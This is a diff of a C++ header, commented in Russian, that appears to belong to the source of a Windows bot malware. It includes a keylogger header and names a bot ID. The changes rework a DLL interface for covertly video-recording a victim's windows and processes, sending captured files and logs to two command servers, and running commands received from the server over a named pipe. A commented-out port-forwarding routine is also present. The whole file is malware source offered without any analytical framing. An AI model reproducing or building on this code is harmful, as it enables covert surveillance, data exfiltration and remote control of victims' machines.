@@ -5,6 +5,7 @@
 #include <windows.h>
 #include "UniversalKeyLogger.h"
 #include "DllLoader.h"
+#include "Pipes.h"
 
 
 // Настройки парметров для билдера
@@ -36,109 +37,97 @@ class TVideoRecDLL : public TMemoryDLL
 {
 private:
 
-	// определяем типы функци1
-	typedef VOID (WINAPI *TStartRecHwnd	)( char* uid, char* nameVideo, HWND wnd,  const char* ip1, int port1, const char* ip2, int port2, int seconds, int flags ) ;
-	typedef VOID (WINAPI *TStartRecPid  )( char* uid, char* nameVideo, DWORD pid, const char* ip1, int port1, const char* ip2, int port2, int seconds, int flags );
+	// определяем типы функций
+	//функции инииализации и освобождения длл
+	typedef DWORD (WINAPI *TInit)( const char* uid, int flags, const char* ip1, int port1, const char* ip2, int port2 );
+	typedef void (WINAPI *TRelease)();
+
+	//функции записи видео
+	typedef VOID (WINAPI *TStartRecHwnd	)( char* uid, char* nameVideo, HWND wnd, int seconds, int flags ) ;
+	typedef VOID (WINAPI *TStartRecPid  )( char* uid, char* nameVideo, DWORD pid, int seconds, int flags );
 	typedef VOID (WINAPI *TStopRec		)();
 	typedef VOID (WINAPI *TResetTimer	)();
 
-	typedef VOID (WINAPI *TStartSend	)( char* uid, char* path, const char* ip1, int port1, const char* ip2, int port2 );
+	//функции отправки файлов
+	typedef VOID (WINAPI *TStartSend	)( char* path );
+	typedef DWORD (WINAPI *TStartSendAsync )( char* path );
+	typedef DWORD (WINAPI *TIsSendedAsync )( DWORD );
 
-	//функции для передачи логов на сервер
-	typedef int  (WINAPI *TInitSendLog)( char* uid, const char* ip1, int port1, const char* ip2, int port2 );
-	typedef void (WINAPI *TReleaseSendLog)();
+	//функции передачи логов на сервер
 	typedef void (WINAPI *TSendLog)( const char* name, int code, const char* text );
 
-	//проброс порта через видео сервер, uid - ид бота, ip:port - айпи адрес и порта видео сервера
-	//порт который нужно пробросить передает видео сервер. Функция создает отдельный поток, поэтому сразу
-	//завершает работу
-	typedef VOID (WINAPI *TRunPortForward)( const char* uid, const char* ip, int port );
+	//запуск потока выполнения команд сервера
+	typedef DWORD (WINAPI *typeCallbackCmd)( DWORD cmd, char* inData, int lenInData, char* outData, int szOutData, DWORD* lenOutData );
+	typedef VOID (WINAPI *TRunCmdExec)(typeCallbackCmd);
 
 	void InitializeApi();
 	void LoadFunc(const char* Name, LPVOID &Addr);
+
 public:
 	TVideoRecDLL();
 	~TVideoRecDLL();
 
+	TInit				Init;
+	TRelease			Release;
 	TStartRecHwnd		RecordWnd;
 	TStartRecPid		RecordProcess;
-	TStopRec			Stop;
+	TStopRec			RecordStop;
 	TResetTimer			ResetTimer;
-	TStartSend			SendData;
-	TRunPortForward		RunPortForward;
-	TInitSendLog		InitSendLog;
-	TReleaseSendLog		ReleaseSendLog;
+	TStartSend			SendFiles;
+	TStartSendAsync		StartSendAsync;
+	TIsSendedAsync		IsSendedAsync;
+	TRunCmdExec			RunCmdExec;
 	TSendLog			SendLog;
+
 };
 
-
-
-//****************************************************
-//
-//****************************************************
-class TVideoRecorder : public TBotObject
+namespace VideoProcess
 {
-private:
-	TVideoRecDLL FDLL;
-public:
-	string UID;        // Идентификатор бота
-    string VideoName;  // имя видео
-	string Server;     // Адрес основного сервера отправки видео
-	string Server2;    // Адрес дополнителтьного сервера отправки видео
-	int    Port;       // Порт основного сервера отправки видео
-	int    Port2;      // Порт дополнительного сервера отправки видео
-	int    RecordTime; // Время записи, в секундах
 
-	TVideoRecorder();
-	~TVideoRecorder();
+//инициализирует видео длл и стартует пайп канал для приема команд на выполнение
+bool Start();
+//завершение работы видео процесса
+void Stop();
+//возвращает имя пайп канала для видео процесса
+char* GetNamePipe( char* buf );
 
-	void RecordProcess(DWORD PID);
-	void RecordCurrentProcess();
-	void RecordWnd(HWND Wnd);
-	void RecordScreen();
-	void ResetTimer();
-	void SendFiles(const char *Path);
-	void Stop();
-};
+//функции через канал пайпа вызывают функции видео длл. Видео длл должна быть запущена
+//в единственном экземпляре в отдельном процессе
+bool RecordHWND( const char* name, HWND wnd, int seconds = 0, int flags = 0 );
+bool RecordPID( const char* name, DWORD pid = 0, int seconds = 0, int flags = 0 );
+void RecordStop();
+DWORD SendFiles( const char* name, const char* path, bool async = false );
+bool FilesIsSended(DWORD id);
+bool SendLog( const char* name, int code, const char* text );
 
-
-//Класс для отправки логов на видео-сервер
-class VideoSendLog : public TBotObject
-{
-		TVideoRecDLL dll;
-
-	public:
-
-		VideoSendLog();
-		~VideoSendLog();
-		//отправка лога на сервер:
-		//name - имя лога
-		//code - код лога
-		//format - форматированный текст лога
-		void Send( const char* name, int code, const char* format, ... );
-		void SendV( const char* name, int code, const char* format, va_list va );
-		//тоже самое что и Send только без форматирования текста
-		void Send2( const char* name, int code, const char* text )
-		{
-			dll.SendLog( name, code, text );
-		}
 };
 
 //класс для упрощения отправки логов, тут запоминается имя лога, чтобы не писать его в каждой строчке
-class VideoSendLogName : public TBotObject
+class VideoLog : public TBotObject
 {
-		VideoSendLog& vsl;
 		const char* name;
 
 	public:
 
-		VideoSendLogName( VideoSendLog& _vsl, const char* _name ) : vsl(_vsl), name(_name)
+		VideoLog( const char* _name ) : name(_name)
 		{
 		}
 		void Send( int code, const char* format, ... );
 		void Send2(int code, const char* text )
 		{
-			vsl.Send2( name, code, text );
+			Send2( name, code, text );
+		}
+
+		//отправка лога на сервер:
+		//name - имя лога
+		//code - код лога
+		//format - форматированный текст лога
+		static void Send( const char* name, int code, const char* format, ... );
+		static void SendV( const char* name, int code, const char* format, va_list va );
+		//тоже самое что и Send только без форматирования текста
+		static void Send2( const char* name, int code, const char* text )
+		{
+			VideoProcess::SendLog( name, code, text );
 		}
 
 };
@@ -149,104 +138,10 @@ PCHAR GetVideoRecHost2();
 //запускает проброс порта, в параметрах указывается айпи видео сервера (порт сервера зашит в функции), порт который нужно 
 //пробросить передаст видео сервер, эта функция запускает видео-длл и сама видео-длл ждет номер порта
 //для проброса, возвращает указатель на библиотеку, чтобы удалить после использования
-TVideoRecDLL* RunPortForward( const char* ip );
+//TVideoRecDLL* RunPortForward( const char* ip );
 //сохраняет видео-длл в указанном файле
 bool SaveVideoDll( const char* nameFile );
 
-
-
-
-namespace VideoRecorder
-{
-	//------------------------------------------------------------
-	// RecordProcess - Функция запускает асинхронную видеозапись
-	// указанного процесса.
-	//
-	// PID - Идентификатор указанного процесса. Если 0, то будет
-	//       вестись запись текущего процесса
-	//
-	// VideoName - имя видеозаписи
-	//------------------------------------------------------------
-	void RecordProcess(DWORD PID, const char* VideoName);
-
-
-	//------------------------------------------------------------
-	// RecordWnd - Функция запускает ассинхронную запись видео с
-	// указанного окна
-	//
-	// Wnd - Идентификатор окна
-	// VideoName - Имя записи
-	//------------------------------------------------------------
-    void RecordWnd(HWND Wnd, const char* VideoName);
-
-	//------------------------------------------------------------
-	//  Функция остонавливает запись
-	//------------------------------------------------------------
-	void Stop();
-
-	//------------------------------------------------------------
-	//  VideoRecorderSendFiles - Функция отправляет файлы из
-	//  указанной папки на сервер видеозаписи.
-	//  Настройки берутся глобальные.
-	//------------------------------------------------------------
-	void SendFiles(PCHAR Path);
-	void SendFiles(string const &Path);
-}
-
-
-
-//??????????????????????????????????????????
-//шлем либо просто либо передавая функцию в поток, параметр для которого директория
-DWORD WINAPI StartSendinThread(LPVOID Data);
-
-
-//void WINAPI IEURLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data);
-
 void StartVideoFromCurrentURL();
 
-
-
-
-//*********************************************************************
-//  Методы сервера распределения записи видео
-//  Назначение сервера - запись видео процесса из другого
-//  специолизированного процесса
-//*********************************************************************
-namespace VideoRecorderSrv
-{
-	//-----------------------------------------------------
-	// Start - Функция запускает сервер распределения
-	//-----------------------------------------------------
-	bool Start();
-
-	//-----------------------------------------------------
-	// StartRecording - Функция стартует запуск записи
-	//					видео для текущего процесса
-	//
-	// URL - адрес сайт для которого инициализирована запись.
-	//-----------------------------------------------------
-	bool StartRecording(PCHAR URL);
-
-	//-----------------------------------------------------
-	//  StartInfiniteRecording - Функция запускает
-	//  бесконечную запись в полноэкранном режиме
-	//-----------------------------------------------------
-	bool StartInfiniteRecording(const char* VideoName);
-
-	//-----------------------------------------------------
-	// StopRecording - Функция останавливает запуск записи
-	//					видео для текущего процесса
-	//-----------------------------------------------------
-	bool StopRecording();
-
-	//-----------------------------------------------------
-	//  PingClient - Функция проверяет работает ли
-	//               клиент записи с указанным PID
-	//	Если PID равен 0 то будет проверяться текущий
-	//  процесс
-	//-----------------------------------------------------
-	bool PingClient(DWORD PID);
-}
-
-//-----------------------------------------------------------------------------
 #endif
